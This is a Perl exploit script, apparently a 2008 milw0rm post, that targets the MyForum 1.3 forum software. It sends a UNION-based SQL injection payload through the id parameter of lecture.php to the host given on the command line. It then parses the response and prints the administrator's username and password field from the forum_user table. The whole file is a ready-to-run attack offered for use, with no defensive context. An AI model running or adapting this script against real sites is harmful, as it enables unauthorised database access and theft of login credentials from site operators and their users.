#!/usr/bin/perl

#***********************************************************************************#
# Remote SQL Injection Exploit                                                      #
#***********************************************************************************#
# Software : MyForum 1.3                                                            #
# Download : http://www.easy-script.com/scripts-dl/myforumv1.3.zip                  #
# Date     : 27 October 2008
# Author   : Vrs-hCk                                                                #
# Contact  : d00r[at]telkom[dot]net                                                 #
#***********************************************************************************#
# Greetz                                                                            #
#***********************************************************************************#
# MainHack BrotherHood - www.MainHack.com - www.ServerIsDown.org                    #
# Paman, OoN_Boy, NoGe, Fluzy, H312Y, s3t4n, Angela Chang, IrcMafia, }^-^{, em|nem, #
# loqsa, pizzyroot, xx_user, ^Bradley, ayulina, MaDOnk, nTc, terbang_melayang,      #
# chawanua, bL4Ck_3n91n3, R3V4N_B4ST4RD, bryan_ae1, dkk ... c0li.m0de.0n !!!        #
#***********************************************************************************#

use HTTP::Request;
use LWP::UserAgent;

$bug = "lecture.php?id=1";
$sql = "+union+select+1,concat(0x21,pseudo,0x3a,mdp,0x21),3,4,5,6,7,8+from+forum_user+where+id=1--";

print "\n ******************************************\n";
print " *     MyForum 1.3 Remote SQL Exploit     *\n";
print " *       For get Admin or User Login      *\n";
print " *            Coded by Vrs-hCk            *\n";
print " ******************************************\n\n";

if (@ARGV != 1) { &help; exit(); }

sub help(){
	print " [?] Use : perl $0 www.target.com\n";
	print "           perl $0 www.target.com/path\n\n";
}

if ($ARGV[0] =~ /http:\/\// ) { $target = $ARGV[0]."/"; } else { $target = "http://".$ARGV[0]."/"; }
print " [SQL] Exploiting ...\n\n";

my $injection = $target.$bug.$sql;
my $request   = HTTP::Request->new(GET=>$injection);
my $useragent = LWP::UserAgent->new();
$useragent->timeout(10);
my $response  = $useragent->request($request);
if ($response->is_success) {
	my $res   = $response->content;
	if ($res =~ m/!(.*):(.*)!/g) {
		my ($username,$passwd) = ($1,$2);
		print " [target] $target \n";
		print " [loginx] $username:$passwd \n\n";
	}
	else { print " [SQL] Error, Fail to get admin login.\n\n"; }
}
else { print " [SQL] Error, ".$response->status_line."\n\n"; }

# milw0rm.com [2008-10-26]
